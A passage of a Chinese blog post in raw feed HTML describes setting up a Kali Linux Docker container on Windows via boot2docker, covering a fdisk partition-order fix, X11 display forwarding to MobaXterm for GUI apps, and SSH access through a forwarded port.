href="#Partition-table-entries-are-not-in-disk-order" class="headerlink" title="Partition table entries are not in disk order"></a>Partition table entries are not in disk order</h2><p><code>fdisk -l</code> 出现<code>Partition table entries are not in disk order</code> 问题。字面上看是分区表和硬盘分区不一致。查资料据说不影响，不过还是试着解决下。</p><ul><li>参考链接<ul><li><a href="https://ubuntuforums.org/showthread.php?t=1252662" target="_blank" rel="noopener">https://ubuntuforums.org/showthread.php?t=1252662</a></li><li><a href="https://blog.csdn.net/wujiangguizhen/article/details/22857667" target="_blank" rel="noopener">https://blog.csdn.net/wujiangguizhen/article/details/22857667</a></li></ul></li><li>操作步骤<ul><li><code>docker-machine ssh default</code></li><li><code>sudo -i</code> 切换到root权限  (<a href="https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password" target="_blank" rel="noopener">https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password</a>)</li><li><code>fdisk /dev/sda</code><ul><li><code>x</code> 进入专家模式</li><li><code>f</code> fix partition order</li><li><code>w</code> 写入变化</li></ul></li><li><img src="1526137422738.png" alt="1526137422738"></li><li>解决后分区状态如下。对比上图可以发现sda1和sda2互换了。<br><img src="1526142973113.png" alt="1526142973113"></li></ul></li></ul><h1 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h1><p>参考链接：</p><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzI4MzAwNTQ3NQ==&amp;mid=209866190&amp;idx=1&amp;sn=0ee75509eb2fab454009125e0a8c6437" target="_blank" rel="noopener">【微信分享】林帆：Docker运行GUI软件的方法</a> </li><li><a href="http://www.cnblogs.com/starspace/archive/2009/02/13/1390062.html" target="_blank" rel="noopener">shell中获取本机ip地址</a> </li><li><a href="https://superuser.com/questions/325630/how-can-i-export-display-from-a-linux-terminal-to-a-windows-pc" target="_blank" rel="noopener">How can I export DISPLAY from a Linux terminal to a Windows PC?</a> </li><li><a href="https://blog.csdn.net/dream_broken/article/details/52414560" target="_blank" rel="noopener">docker学习8–同主机下容器通信</a> </li><li><a href="https://askubuntu.com/questions/432255/what-is-the-display-environment-variable" target="_blank" rel="noopener">What is the $DISPLAY environment variable?</a> </li><li><a href="https://stackoverflow.com/questions/24095968/docker-for-gui-based-environments" target="_blank" rel="noopener">Docker for GUI-based environments?</a> </li><li><a href="https://stackoverflow.com/questions/16296753/can-you-run-gui-apps-in-a-docker-container" target="_blank" rel="noopener">Can you run GUI apps in a docker container?</a></li></ul><p>大致理解Docker网络结构和XX转发流程</p><p><img src="1526182398234.png" alt="1526182398234"></p><p>启动一个新配制参数的容器，将主机上X11的unix套接字共享到kali容器里面 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it  -v /etc/localtime:/etc/localtime:ro -v /tmp/.X11-unix:/tmp/.X11-unix  -e DISPLAY=<span class="string">"192.168.233.101:0.0"</span>  -e GDK_SCALE  -e GDK_DPI_SCALE --name gkali findneo/kali:v1 bash</span><br></pre></td></tr></table></figure><p>在<code>Setting-&gt;Configuration</code> 里取消MobaXterm的X server的访问控制。</p><p><img src="1526182806764.png" alt="1526182806764"></p><p>启动容器即可使用GUI。可以使用<code>xcal,xclock,xedit,xmessage,xeyes,xmessage</code> 等等小程序测试X11转发是否正常工作（<code>ls /usr/bin/x*</code> 可以看到更多）</p><p><img src="1526182630443.png" alt="1526182630443"></p><h2 id="SSH-连入"><a href="#SSH-连入" class="headerlink" title="SSH 连入"></a>SSH 连入</h2><p>从容器访问主机可以直接使用主机的IP地址（<code>ipconfig</code>），从主机访问容器实际上是访问<code>boot2docker</code> 虚拟机的IP （<code>docker-machine.exe ssh default &quot;/sbin/ifconfig eth1|sed -n &#39;/inet addr/s/^[^:]*:\([0-9.]\{7,15\}\) .*/\1/p&#39;&quot;</code>）和启动容器时配置的转发端口 （<code>docker run -p 12345:22 ...</code> ）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">所以理论上这样启动一个容器既可以SSH连入，又可以使用图形界面。</span><br><span class="line">docker run -it  -v /etc/localtime:/etc/localtime:ro -v /tmp/.X11-unix:/tmp/.X11-unix  -e DISPLAY=<span class="string">"192.168.233.101:0.0"</span>  -e GDK_SCALE  -e GDK_DPI_SCALE -p 52023:22 --name kali findneo/kali:v2</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://yeasy.gitbooks.io/docker_practice/content/" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/content/</a>  </li><li><a href="https://blogs.technet.microsoft.com/positivesecurity/2017/09/01/setting-up-kali-linux-in-docker-on-windows-10/" target="_blank" rel="noopener">https://blogs.technet.microsoft.com/positivesecurity/2017/09/01/setting-up-kali-linux-in-docker-on-windows-10/</a>   </li><li><a href="https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password" target="_blank" rel="noopener">https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password</a> </li><li><a href="https://ubuntuforums.org/showthread.php?t=1252662" target="_blank" rel="noopener">https://ubuntuforums.org/showthread.php?t=1252662</a><ul><li><a href="https://blog.csdn.net/wujiangguizhen/article/details/22857667" target="_blank" rel="noopener">https://blog.csdn.net/wujiangguizhen/article/details/22857667</a> </li><li><a href="https://stackoverflow.com/questions/11659005/how-to-resize-a-virtualbox-vmdk-file" target="_blank" rel="noopener">https://stackoverflow.com/questions/11659005/how-to-resize-a-virtualbox-vmdk-file</a> </li></ul></li></ul><blockquote><p>容器不应该是长久性的东西，要保持容器的可抛弃性，有问题就应该rm掉，数据保存在容器外，然后直接run新的容器。 ——<a href="http://www.talkwithtrend.com/Question/233635" target="_blank" rel="noopener">http://www.talkwithtrend.com/Question/233635</a> </p></blockquote><p>看到上面这个，感觉自己的用法可能有点奇怪：）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;全程需保证保证网络畅通&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;安装Docker&quot;&gt;&lt;a href=&quot;#安装Docker&quot; class=&quot;headerlink&quot; title=&quot;安装Docker&quot;&gt;&lt;/a&gt;安装Docker&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;从
      
    
    </summary>
    
    
  </entry>
  
</feed>
